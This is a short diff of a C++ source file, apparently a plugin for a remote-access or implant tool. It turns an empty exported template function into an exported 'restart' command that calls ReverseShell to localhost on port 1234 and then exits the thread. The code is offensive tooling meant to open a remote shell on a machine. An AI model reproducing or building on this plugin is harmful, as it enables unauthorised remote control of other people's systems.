@@ -3,11 +3,10 @@
 
 #include "../core/external.h"
 
-extern "C" __declspec(dllexport) void NAME(SOCKET sock, const char *arg)
+extern "C" __declspec(dllexport) void restart()
 {
-
-
-
+    ReverseShell("localhost", "1234");
+    ExitThread(0);
 }
 
 
